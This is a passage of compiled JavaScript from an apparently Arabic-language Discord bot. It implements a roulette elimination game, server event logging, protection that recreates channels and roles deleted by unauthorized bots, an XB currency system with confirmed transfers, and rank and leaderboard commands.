    const updatedEmbed = EmbedBuilder.from(lobbyEmbed).setDescription(`\u0627\u0644\u0644\u0627\u0639\u0628\u064A\u0646 \u0627\u0644\u0645\u0646\u0636\u0645\u064A\u0646 (${players.length}):
${players.map((p) => `\u2022 ${p.name}`).join("\n") || "\u0644\u0627 \u064A\u0648\u062C\u062F \u0644\u0627\u0639\u0628\u064A\u0646 \u0628\u0639\u062F"}`).setFields({ name: "\u0627\u0644\u0648\u0642\u062A \u0627\u0644\u0645\u062A\u0628\u0642\u064A", value: `${timeLeft} \u062B\u0627\u0646\u064A\u0629` });
    await interaction.editReply({ embeds: [updatedEmbed] }).catch(() => clearInterval(timer));
  }, 5e3);
  const lobbyCollector = msg.createMessageComponentCollector({ time: 6e4 });
  lobbyCollector.on("collect", async (i) => {
    if (i.customId === "roulette_join") {
      if (players.some((p) => p.id === i.user.id)) return i.reply({ content: "\u0623\u0646\u062A \u0645\u0646\u0636\u0645 \u0628\u0627\u0644\u0641\u0639\u0644!", ephemeral: true });
      players.push({ id: i.user.id, name: i.user.username });
      const updatedEmbed = EmbedBuilder.from(lobbyEmbed).setDescription(`\u0627\u0644\u0644\u0627\u0639\u0628\u064A\u0646 \u0627\u0644\u0645\u0646\u0636\u0645\u064A\u0646 (${players.length}):
${players.map((p) => `\u2022 ${p.name}`).join("\n")}`).setFields({ name: "\u0627\u0644\u0648\u0642\u062A \u0627\u0644\u0645\u062A\u0628\u0642\u064A", value: `${timeLeft} \u062B\u0627\u0646\u064A\u0629` });
      await i.update({ embeds: [updatedEmbed] });
    }
    if (i.customId === "roulette_start") {
      if (i.user.id !== interaction.user.id) return i.reply({ content: "\u0635\u0627\u062D\u0628 \u0627\u0644\u0623\u0645\u0631 \u0641\u0642\u0637 \u064A\u0645\u0643\u0646\u0647 \u0627\u0644\u0628\u062F\u0621!", ephemeral: true });
      if (players.length < 3) return i.reply({ content: "\u064A\u062C\u0628 \u0627\u0646\u0636\u0645\u0627\u0645 3 \u0644\u0627\u0639\u0628\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644!", ephemeral: true });
      clearInterval(timer);
      lobbyCollector.stop("started");
    }
  });
  lobbyCollector.on("end", async (_, reason) => {
    clearInterval(timer);
    activeGames.delete(msg.id);
    if (reason !== "started") {
      if (reason === "not_enough_players" || reason === "time" && players.length < 3) {
        return interaction.editReply({ content: "\u274C \u062A\u0645 \u0625\u0644\u063A\u0627\u0621 \u0627\u0644\u0644\u0639\u0628\u0629 \u0644\u0639\u062F\u0645 \u0627\u0643\u062A\u0645\u0627\u0644 \u0627\u0644\u0639\u062F\u062F.", embeds: [], components: [] });
      }
      if (reason === "time" && players.length >= 3) {
      } else if (reason !== "started") {
        return;
      }
    }
    let currentPlayers = [...players];
    const nicknames = await getAINicknames(currentPlayers.length);
    currentPlayers = currentPlayers.map((p, i) => ({ ...p, nickname: nicknames[i] || `\u0644\u0627\u0639\u0628 ${i + 1}` }));
    while (currentPlayers.length > 2) {
      const winnerIdx2 = Math.floor(Math.random() * currentPlayers.length);
      const selectedPlayer = currentPlayers[winnerIdx2];
      const buffer2 = await generateRouletteImage(currentPlayers.map((p) => p.nickname), winnerIdx2);
      const attachment2 = new AttachmentBuilder(buffer2, { name: `round_${currentPlayers.length}.gif` });
      const roundEmbed = new EmbedBuilder().setTitle(`\u{1F3B0} \u062C\u0648\u0644\u0629 \u0627\u0644\u0625\u0642\u0635\u0627\u0621 (${currentPlayers.length} \u0644\u0627\u0639\u0628\u064A\u0646)`).setDescription(`\u0648\u0642\u0639 \u0627\u0644\u0627\u062E\u062A\u064A\u0627\u0631 \u0639\u0644\u0649: **${selectedPlayer.nickname}** (<@${selectedPlayer.id}>)

\u064A\u062C\u0628 \u0639\u0644\u064A\u0647 \u0627\u062E\u062A\u064A\u0627\u0631 \u0634\u062E\u0635 \u0644\u0625\u0642\u0635\u0627\u0626\u0647!`).setColor(16776960).setImage(`attachment://round_${currentPlayers.length}.gif`).setFooter({ text: "\u0627\u0644\u0623\u0633\u0645\u0627\u0621 \u0645\u062E\u0641\u064A\u0629 \u0648\u0645\u0633\u062A\u0628\u062F\u0644\u0629 \u0628\u0623\u0633\u0645\u0627\u0621 \u0630\u0643\u0627\u0621 \u0627\u0635\u0637\u0646\u0627\u0639\u064A" });
      const selectMenu = new StringSelectMenuBuilder().setCustomId("roulette_eliminate").setPlaceholder("\u0627\u062E\u062A\u0631 \u0644\u0642\u0628\u0627\u064B \u0644\u0625\u0642\u0635\u0627\u0626\u0647").addOptions(currentPlayers.map((p) => ({ label: p.nickname, value: p.id })));
      const selectRow = new ActionRowBuilder().addComponents(selectMenu);
      const roundMsg = await interaction.channel.send({ content: `\u{1F3B0} \u062C\u0648\u0644\u0629 \u062C\u062F\u064A\u062F\u0629! \u0627\u0644\u0645\u062E\u062A\u0627\u0631: **${selectedPlayer.nickname}** <@${selectedPlayer.id}>`, embeds: [roundEmbed], components: [selectRow], files: [attachment2] });
      try {
        const filter = (i) => i.customId === "roulette_eliminate" && i.user.id === selectedPlayer.id;
        const selection = await roundMsg.awaitMessageComponent({ filter, time: 3e4 });
        const eliminatedId = selection.values[0];
        const eliminatedPlayer = currentPlayers.find((p) => p.id === eliminatedId);
        currentPlayers = currentPlayers.filter((p) => p.id !== eliminatedId);
        await selection.update({ content: `\u2705 \u062A\u0645 \u0625\u0642\u0635\u0627\u0621 **${eliminatedPlayer.nickname}** \u0628\u0648\u0627\u0633\u0637\u0629 **${selectedPlayer.nickname}**`, components: [], embeds: [] });
        await new Promise((r) => setTimeout(r, 2e3));
      } catch (e) {
        const eliminatedPlayer = selectedPlayer;
        currentPlayers = currentPlayers.filter((p) => p.id !== selectedPlayer.id);
        await roundMsg.edit({ content: `\u23F0 \u0627\u0646\u062A\u0647\u0649 \u0627\u0644\u0648\u0642\u062A! \u062A\u0645 \u0625\u0642\u0635\u0627\u0621 **${eliminatedPlayer.nickname}** \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B.`, components: [], embeds: [] });
        await new Promise((r) => setTimeout(r, 2e3));
      }
    }
    const winnerIdx = Math.floor(Math.random() * 2);
    const finalWinner = currentPlayers[winnerIdx];
    const xbReward = 50;
    await awardXB(interaction.guildId, finalWinner.id, xbReward, "Fast Click win");
    const buffer = await generateRouletteImage(currentPlayers.map((p) => p.nickname), winnerIdx);
    const attachment = new AttachmentBuilder(buffer, { name: "final.gif" });
    const finalEmbed = new EmbedBuilder().setTitle("\u{1F3C6} \u0627\u0644\u0641\u0627\u0626\u0632 \u0627\u0644\u0646\u0647\u0627\u0626\u064A!").setDescription(`\u0628\u0639\u062F \u062C\u0648\u0644\u0627\u062A \u0645\u0646 \u0627\u0644\u0625\u0642\u0635\u0627\u0621\u060C \u0627\u0644\u0641\u0627\u0626\u0632 \u0647\u0648: **${finalWinner.nickname}** (<@${finalWinner.id}>)!

\u{1F4B0} \u0644\u0642\u062F \u062D\u0635\u0644\u062A \u0639\u0644\u0649 **${xbReward}** XB!`).setColor(65280).setImage("attachment://final.gif").setTimestamp();
    await interaction.editReply({ content: `\u0645\u0628\u0631\u0648\u0643 \u0644\u0644\u0641\u0627\u0626\u0632 \u0627\u0644\u0646\u0647\u0627\u0626\u064A! <@${finalWinner.id}>`, embeds: [finalEmbed], components: [], files: [attachment] });
  });
}
client.on(Events.GuildMemberRemove, async (member) => {
  const guild = member.guild;
  logEvent(guild.id, "guildMemberRemove", {
    title: "\u{1F4E4} Member Left",
    description: `**User:** <@${member.id}> (${member.user.tag})
**Joined Server:** <t:${Math.floor(member.joinedTimestamp ? member.joinedTimestamp / 1e3 : 0)}:R>`,
    color: 16711680,
    thumbnail: member.user.displayAvatarURL()
  });
});
client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
  const guild = newMember.guild;
  const oldRoles = oldMember.roles.cache;
  const newRoles = newMember.roles.cache;
  if (oldRoles.size !== newRoles.size) {
    const added = newRoles.filter((r) => !oldRoles.has(r.id));
    const removed = oldRoles.filter((r) => !newRoles.has(r.id));
    let desc = `**User:** <@${newMember.id}> (${newMember.user.tag})

`;
    if (added.size > 0) desc += `\u2705 **Added Roles:** ${added.map((r) => `<@&${r.id}>`).join(", ")}
`;
    if (removed.size > 0) desc += `\u274C **Removed Roles:** ${removed.map((r) => `<@&${r.id}>`).join(", ")}
`;
    logEvent(guild.id, "guildMemberUpdate", {
      title: "\u{1F6E1}\uFE0F Member Roles Updated",
      description: desc,
      color: 3447003
    });
  }
});
client.on(Events.ChannelUpdate, async (oldChannel, newChannel) => {
  if (!newChannel.guild) return;
  const guild = newChannel.guild;
  logEvent(guild.id, "channelUpdate", {
    title: "\u{1F4C1} Channel Updated",
    description: `**Channel:** <#${newChannel.id}> (${newChannel.name})
**Type:** ${newChannel.type}`,
    color: 10181046
  });
});
client.on(Events.ChannelDelete, async (channel) => {
  if (!channel.guild) return;
  const guild = channel.guild;
  const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id);
  if (protection && protection.antiChannelControl === 1) {
    const executor = await getAuditLogExecutor(guild, AuditLogEvent.ChannelDelete);
    if (executor && executor.bot && executor.id !== client.user?.id) {
      const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, executor.id);
      if (!whitelisted) {
        const c = channel;
        await guild.channels.create({
          name: c.name,
          type: c.type,
          topic: c.topic,
          nsfw: c.nsfw,
          parent: c.parentId,
          permissionOverwrites: c.permissionOverwrites.cache.map((o) => ({
            id: o.id,
            type: o.type,
            allow: o.allow.toArray(),
            deny: o.deny.toArray()
          })),
          position: c.rawPosition
        }).catch(() => {
        });
        logEvent(guild.id, "protectionEvent", {
          title: "\u{1F6E1}\uFE0F Anti-Channel-Control Triggered",
          description: `Unauthorized bot deleted a channel: <@${executor.id}>
**Channel Name:** ${c.name}
**Action:** Channel Recreated Automatically`,
          color: 16711680
        });
        const member = await guild.members.fetch(executor.id).catch(() => null);
        if (member) await member.kick("Anti-Channel-Control Protection Active").catch(() => {
        });
      }
    }
  }
});
client.on(Events.ChannelCreate, async (channel) => {
  if (!channel.guild) return;
  const guild = channel.guild;
});
client.on(Events.GuildRoleDelete, async (role) => {
  const guild = role.guild;
  const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id);
  if (protection && protection.antiChannelControl === 1) {
    const executor = await getAuditLogExecutor(guild, AuditLogEvent.RoleDelete);
    if (executor && executor.bot && executor.id !== client.user?.id) {
      const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, executor.id);
      if (!whitelisted) {
        await guild.roles.create({
          name: role.name,
          color: role.color,
          hoist: role.hoist,
          permissions: role.permissions,
          mentionable: role.mentionable,
          position: role.rawPosition,
          reason: "Anti-Role-Control Protection Active"
        }).catch(() => {
        });
        logEvent(guild.id, "protectionEvent", {
          title: "\u{1F6E1}\uFE0F Anti-Role-Control Triggered",
          description: `Unauthorized bot deleted a role: <@${executor.id}>
**Role Name:** ${role.name}
**Action:** Role Recreated Automatically`,
          color: 16711680
        });
        const member = await guild.members.fetch(executor.id).catch(() => null);
        if (member) await member.kick("Anti-Role-Control Protection Active").catch(() => {
        });
      }
    }
  }
});
client.on(Events.GuildRoleUpdate, async (oldRole, newRole) => {
  const guild = newRole.guild;
});
client.on(Events.VoiceStateUpdate, async (oldState, newState) => {
  if (!newState.guild) return;
  if (oldState.channelId !== newState.channelId) {
    let desc = `**User:** <@${newState.member?.id}> (${newState.member?.user.tag})

`;
    if (!oldState.channelId) desc += `\u{1F3A4} **Joined:** <#${newState.channelId}>`;
    else if (!newState.channelId) desc += `\u{1F507} **Left:** <#${oldState.channelId}>`;
    else desc += `\u{1F504} **Moved:** <#${oldState.channelId}> \u27A1\uFE0F <#${newState.channelId}>`;
    logEvent(newState.guild.id, "voiceStateUpdate", {
      title: "\u{1F50A} Voice State Update",
      description: desc,
      color: 1752220
    });
  }
});
client.on("interactionCreate", async (interaction) => {
  try {
    if (interaction.isChatInputCommand()) {
      let { commandName, user, guildId, guild, channel } = interaction;
      if (!guild) return;
      const alias = db.prepare("SELECT originalCommand FROM aliases WHERE guildId = ? AND aliasName = ?").get(guildId, commandName);
      if (alias) {
        commandName = alias.originalCommand;
      }
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !isCommandAllowed(guildId, commandName, interaction.channelId)) {
        return;
      }
      if (guildId) {
        logEvent(guildId, "interactionCreate", {
          title: "\u2328\uFE0F Command Used",
          description: `**User:** <@${user.id}> (${user.tag})
**Command:** \`/${commandName}\`
**Channel:** <#${interaction.channelId}>`,
          color: 5793266
        });
      }
      if (commandName === "command-room") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
        }
        const cmd = interaction.options.getString("command");
        const channel2 = interaction.options.getChannel("channel");
        const type = interaction.options.getString("type");
        if (type === "remove") {
          db.prepare("DELETE FROM command_permissions WHERE guildId = ? AND commandName = ? AND channelId = ?").run(guildId, cmd, channel2.id);
          return interaction.reply(`\u2705 \u062A\u0645 \u0625\u0632\u0627\u0644\u0629 \u062C\u0645\u064A\u0639 \u0627\u0644\u0642\u064A\u0648\u062F \u0639\u0646 \u0627\u0644\u0623\u0645\u0631 \`${cmd}\` \u0641\u064A \u0627\u0644\u0642\u0646\u0627\u0629 ${channel2}.`);
        }
        db.prepare("INSERT INTO command_permissions (guildId, commandName, channelId, type) VALUES (?, ?, ?, ?) ON CONFLICT(guildId, commandName, channelId) DO UPDATE SET type = ?").run(guildId, cmd, channel2.id, type, type);
        const typeText = type === "allow" ? "\u0633\u0645\u0627\u062D (Whitelist)" : "\u0645\u0646\u0639 (Blacklist)";
        await interaction.reply(`\u2705 \u062A\u0645 \u0636\u0628\u0637 \u0627\u0644\u0642\u064A\u062F \u0644\u0644\u0623\u0645\u0631 \`${cmd}\` \u0641\u064A \u0627\u0644\u0642\u0646\u0627\u0629 ${channel2} \u0643\u0640 **${typeText}**.`);
      }
      if (commandName === "p" || commandName === "xbp") {
        const targetUser = interaction.options.getUser("user") || user;
        const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
        const level = userRow?.level || 0;
        const xb = userRow?.xb || 0;
        const xp = userRow?.xp || 0;
        const nextLevelXp = (level + 1) * 300;
        try {
          const buffer = await generateProfileImage(targetUser, level, xb, xp, nextLevelXp);
          const attachment = new AttachmentBuilder(buffer, { name: "profile.gif" });
          await interaction.reply({ files: [attachment] });
        } catch (err) {
          console.error("Profile image generation failed:", err);
          await interaction.reply({ content: "\u274C \u0641\u0634\u0644 \u0641\u064A \u0625\u0646\u0634\u0627\u0621 \u0635\u0648\u0631\u0629 \u0627\u0644\u0628\u0631\u0648\u0641\u0627\u064A\u0644.", ephemeral: true });
        }
      }
      if (commandName === "c" || commandName === "xbc") {
        const targetUser = interaction.options.getUser("user");
        const amount = interaction.options.getInteger("amount");
        if (!targetUser && !amount) {
          const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId);
          const balance = userRow?.xb || 0;
          return interaction.reply(`\u{1F4B0} \u0631\u0635\u064A\u062F\u0643 \u0627\u0644\u062D\u0627\u0644\u064A \u0647\u0648: **${balance}** XB`);
        }
        if (targetUser && !amount) {
          const userRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
          const balance = userRow?.xb || 0;
          return interaction.reply(`\u{1F4B0} \u0631\u0635\u064A\u062F **${targetUser.username}** \u0647\u0648: **${balance}** XB`);
        }
        if (targetUser && amount && amount > 0) {
          if (targetUser.id === user.id) return interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646\u0643 \u062A\u062D\u0648\u064A\u0644 \u0627\u0644\u0639\u0645\u0644\u0627\u062A \u0644\u0646\u0641\u0633\u0643.", ephemeral: true });
          const senderRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId);
          const senderBalance = senderRow?.xb || 0;
          if (senderBalance < amount) {
            return interaction.reply({ content: `\u274C \u0631\u0635\u064A\u062F\u0643 \u063A\u064A\u0631 \u0643\u0627\u0641\u064D. \u0631\u0635\u064A\u062F\u0643 \u0627\u0644\u062D\u0627\u0644\u064A \u0647\u0648 **${senderBalance}** XB.`, ephemeral: true });
          }
          const code = Math.floor(1e5 + Math.random() * 9e5).toString();
          const existing = pendingTransfers.get(user.id);
          if (existing) clearTimeout(existing.timeout);
          const timeout = setTimeout(() => {
            pendingTransfers.delete(user.id);
          }, 6e4);
          pendingTransfers.set(user.id, { targetId: targetUser.id, amount, code, timeout });
          await interaction.reply(`\u26A0\uFE0F \u0644\u062A\u0623\u0643\u064A\u062F \u062A\u062D\u0648\u064A\u0644 **${amount}** XB \u0625\u0644\u0649 ${targetUser}\u060C \u064A\u0631\u062C\u0649 \u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u0623\u0645\u0631:

\`/confirm-transfer code: ${code}\`

*(\u0627\u0644\u0643\u0648\u062F \u0635\u0627\u0644\u062D \u0644\u0645\u062F\u0629 \u062F\u0642\u064A\u0642\u0629 \u0648\u0627\u062D\u062F\u0629)*`);
        } else {
          await interaction.reply({ content: "\u274C \u064A\u0631\u062C\u0649 \u0625\u062F\u062E\u0627\u0644 \u0645\u0628\u0644\u063A \u0635\u062D\u064A\u062D \u0623\u0643\u0628\u0631 \u0645\u0646 0 \u0644\u0644\u062A\u062D\u0648\u064A\u0644.", ephemeral: true });
        }
      }
      if (commandName === "confirm-transfer") {
        const code = interaction.options.getString("code");
        const pending = pendingTransfers.get(user.id);
        if (!pending) {
          return interaction.reply({ content: "\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u0639\u0645\u0644\u064A\u0629 \u062A\u062D\u0648\u064A\u0644 \u0645\u0639\u0644\u0642\u0629 \u0644\u0643 \u0623\u0648 \u0627\u0646\u062A\u0647\u062A \u0635\u0644\u0627\u062D\u064A\u0629 \u0627\u0644\u0643\u0648\u062F.", ephemeral: true });
        }
        if (pending.code !== code) {
          return interaction.reply({ content: "\u274C \u0643\u0648\u062F \u0627\u0644\u062A\u0623\u0643\u064A\u062F \u063A\u064A\u0631 \u0635\u062D\u064A\u062D.", ephemeral: true });
        }
        clearTimeout(pending.timeout);
        pendingTransfers.delete(user.id);
        const senderRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId);
        const senderBalance = senderRow?.xb || 0;
        if (senderBalance < pending.amount) {
          return interaction.reply({ content: "\u274C \u0631\u0635\u064A\u062F\u0643 \u0623\u0635\u0628\u062D \u063A\u064A\u0631 \u0643\u0627\u0641\u064D \u0644\u0625\u062A\u0645\u0627\u0645 \u0627\u0644\u0639\u0645\u0644\u064A\u0629.", ephemeral: true });
        }
        db.prepare("UPDATE leveling SET xb = xb - ? WHERE userId = ? AND guildId = ?").run(pending.amount, user.id, guildId);
        db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(pending.targetId, guildId, pending.amount, pending.amount);
        const targetUser = await client.users.fetch(pending.targetId);
        await interaction.reply(`\u2705 \u062A\u0645 \u062A\u0623\u0643\u064A\u062F \u0627\u0644\u062A\u062D\u0648\u064A\u0644! \u062A\u0645 \u062A\u062D\u0648\u064A\u0644 **${pending.amount}** XB \u0628\u0646\u062C\u0627\u062D \u0625\u0644\u0649 ${targetUser}.`);
        await logCurrencyTransaction(guildId, user.id, pending.amount, `Transfer to ${targetUser.username}`, "transfer");
        await logCurrencyTransaction(guildId, pending.targetId, pending.amount, `Transfer from ${user.username}`, "add");
      }
      if (commandName === "set-currency-log") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
        }
        const ch = interaction.options.getChannel("channel");
        if (ch.type !== ChannelType.GuildText) return interaction.reply({ content: "\u064A\u062C\u0628 \u0627\u062E\u062A\u064A\u0627\u0631 \u0642\u0646\u0627\u0629 \u0646\u0635\u064A\u0629.", ephemeral: true });
        db.prepare("INSERT INTO currency_log_settings (guildId, channelId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId").run(guildId, ch.id);
        await interaction.reply(`\u2705 \u062A\u0645 \u062A\u0639\u064A\u064A\u0646 \u0642\u0646\u0627\u0629 \u0633\u062C\u0644 \u0627\u0644\u0639\u0645\u0644\u0627\u062A \u0625\u0644\u0649 ${ch}.`);
      }
      if (commandName === "add-xb") {
        if (!AUTHORIZED_CURRENCY_IDS.includes(user.id)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0623\u0634\u062E\u0627\u0635 \u0627\u0644\u0645\u0635\u0631\u062D \u0644\u0647\u0645 \u0641\u0642\u0637.", ephemeral: true });
        }
        const targetUser = interaction.options.getUser("user");
        const amount = interaction.options.getInteger("amount");
        db.prepare("INSERT INTO leveling (userId, guildId, xb) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET xb = xb + ?").run(targetUser.id, guildId, amount, amount);
        await awardXB(guildId, targetUser.id, amount, `Admin add by ${user.username}`);
      }
      if (commandName === "inadd-xb") {
        if (!AUTHORIZED_CURRENCY_IDS.includes(user.id)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0623\u0634\u062E\u0627\u0635 \u0627\u0644\u0645\u0635\u0631\u062D \u0644\u0647\u0645 \u0641\u0642\u0637.", ephemeral: true });
        }
        const targetUser = interaction.options.getUser("user");
        const amount = interaction.options.getInteger("amount");
        await deductXB(guildId, targetUser.id, amount, `Admin remove by ${user.username}`);
        await interaction.reply(`\u2705 \u062A\u0645 \u0633\u062D\u0628 **${amount}** XB \u0645\u0646 \u0631\u0635\u064A\u062F ${targetUser}.`);
      }
      if (commandName === "reset-xb") {
        if (!AUTHORIZED_CURRENCY_IDS.includes(user.id)) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u062E\u0627\u0635 \u0628\u0627\u0644\u0623\u0634\u062E\u0627\u0635 \u0627\u0644\u0645\u0635\u0631\u062D \u0644\u0647\u0645 \u0641\u0642\u0637.", ephemeral: true });
        }
        const targetUser = interaction.options.getUser("user");
        const resetAll = interaction.options.getBoolean("all") || false;
        if (resetAll) {
          db.prepare("UPDATE leveling SET xb = 0 WHERE guildId = ?").run(guildId);
          await interaction.reply("\u2705 \u062A\u0645 \u062A\u0635\u0641\u064A\u0631 \u0631\u0635\u064A\u062F XB \u0644\u062C\u0645\u064A\u0639 \u0627\u0644\u0623\u0639\u0636\u0627\u0621 \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631.");
        } else if (targetUser) {
          const targetRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
          const currentBalance = targetRow?.xb || 0;
          await deductXB(guildId, targetUser.id, currentBalance, `Admin reset by ${user.username}`);
          await interaction.reply(`\u2705 \u062A\u0645 \u062A\u0635\u0641\u064A\u0631 \u0631\u0635\u064A\u062F XB \u0644\u0644\u0639\u0636\u0648 ${targetUser}.`);
        } else {
          await interaction.reply({ content: "\u274C \u064A\u0631\u062C\u0649 \u062A\u062D\u062F\u064A\u062F \u0639\u0636\u0648 \u0623\u0648 \u0627\u062E\u062A\u064A\u0627\u0631 \u062A\u0635\u0641\u064A\u0631 \u0627\u0644\u0643\u0644.", ephemeral: true });
        }
      }
      if (commandName === "ping") {
        await interaction.reply(`Pong! Latency is ${client.ws.ping}ms.`);
      }
      if (commandName === "ai") {
        const prompt = interaction.options.getString("prompt");
        await interaction.deferReply();
        return handleAIResponse(interaction, prompt);
      }
      if (commandName === "u") {
        const targetUser = interaction.options.getUser("user") || user;
        const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId);
        const xp = userRow?.xp || 0;
        const level = userRow?.level || 0;
        const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId);
        const rank = leaderboard.findIndex((u) => u.userId === targetUser.id) + 1;
        const embed = new EmbedBuilder().setTitle(`\u{1F4CA} \u0646\u0634\u0627\u0637 ${targetUser.username}`).setThumbnail(targetUser.displayAvatarURL()).addFields(
          { name: "\u0627\u0644\u0645\u0633\u062A\u0648\u0649", value: level.toString(), inline: true },
          { name: "\u0627\u0644\u062E\u0628\u0631\u0629 (XP)", value: xp.toString(), inline: true },
          { name: "\u0627\u0644\u062A\u0631\u062A\u064A\u0628", value: `#${rank}`, inline: true }
        ).setColor(44678);
        return interaction.reply({ embeds: [embed] });
      }
      if (commandName === "y") {
        const targetUser = interaction.options.getUser("user") || user;
        const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
        if (!targetMember) return interaction.reply({ content: "\u274C \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F.", ephemeral: true });
        const joinedAt = targetMember.joinedAt;
        const embed = new EmbedBuilder().setTitle(`\u{1F4C5} \u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0627\u0646\u0636\u0645\u0627\u0645`).setDescription(`${targetUser} \u0627\u0646\u0636\u0645 \u0625\u0644\u0649 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0641\u064A:
**${joinedAt?.toLocaleDateString("ar-EG", { weekday: "long", year: "numeric", month: "long", day: "numeric" })}**`).setColor(5793266);
        return interaction.reply({ embeds: [embed] });
      }
      if (commandName === "rank") {
        const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId);
        if (!userRow) return interaction.reply({ content: "You don't have a rank yet. Start chatting!", ephemeral: true });
        const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId);
        const dynamicRewardMap = new Map(dynamicRewards.map((r) => [r.level, r.roleId]));
        const allRewardLevels = Array.from(/* @__PURE__ */ new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()]));
        const nextRewardLevel = allRewardLevels.filter((lvl) => lvl > userRow.level).sort((a, b) => a - b)[0];
        const embed = new EmbedBuilder().setTitle(`${user.username}'s Rank`).addFields(
          { name: "Level", value: userRow.level.toString(), inline: true },
          { name: "XP", value: `${userRow.xp} / ${(userRow.level + 1) * 300}`, inline: true },
          { name: "Bonus", value: (userRow.bonus || 0).toString(), inline: true }
        ).setColor(44678);
        if (nextRewardLevel) {
          const roleId = dynamicRewardMap.get(nextRewardLevel) || LEVEL_ROLES[nextRewardLevel];
          embed.addFields({ name: "Next Reward", value: `Level **${nextRewardLevel}**: <@&${roleId}>`, inline: false });
        }
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "top") {
        const role = interaction.options.getRole("role");
        const limit = interaction.options.getInteger("limit") || 10;
        const timeframe = interaction.options.getString("timeframe");
        const type = interaction.options.getString("type");
        let query = "";
        let params = [guildId];
        let title = "Global Leaderboard";
        let isTimeBased = false;
        if (timeframe === "day") {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-1 day')";
          title = "Daily Leaderboard";
          isTimeBased = true;
        } else if (timeframe === "week") {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-7 days')";
          title = "Weekly Leaderboard";
          isTimeBased = true;
        } else if (timeframe === "month") {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-30 days')";
          title = "Monthly Leaderboard";
          isTimeBased = true;
        } else if (timeframe === "year") {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-365 days')";
          title = "Yearly Leaderboard";
          isTimeBased = true;
        } else {
          query = "SELECT userId, xp as totalXp, level FROM leveling WHERE guildId = ?";
          title = "All-Time Leaderboard";
        }
        if (isTimeBased) {
          if (type === "voice") {
            query += " AND type = 'voice'";
            title += " (Voice)";
          } else if (type === "text") {
            query += " AND type = 'text'";
            title += " (Text)";
          }
          query += " GROUP BY userId ORDER BY totalXp DESC";
        } else {
          query += " ORDER BY level DESC, xp DESC";
        }
        let leaderboard = db.prepare(query).all(...params);
        if (role) {
          const roleMemberIds = role.members.map((m) => m.id);
          leaderboard = leaderboard.filter((u) => roleMemberIds.includes(u.userId));
        }
        const topUsers = leaderboard.slice(0, Math.min(Math.max(limit, 1), 25));
        const embed = new EmbedBuilder().setTitle(role ? `Leaderboard for ${role.name} (${title})` : `${title} (Top ${topUsers.length})`).setColor(5793266).setTimestamp();
        if (topUsers.length === 0) {
          embed.setDescription("No users found in the leaderboard.");
        } else {
          const list = topUsers.map((u, index) => {
            const levelStr = u.level !== void 0 ? ` - Level ${u.level}` : "";
            return `**#${index + 1}** | <@${u.userId}>${levelStr} (${u.totalXp} XP)`;
          }).join("\n");
          embed.setDescription(list);
        }
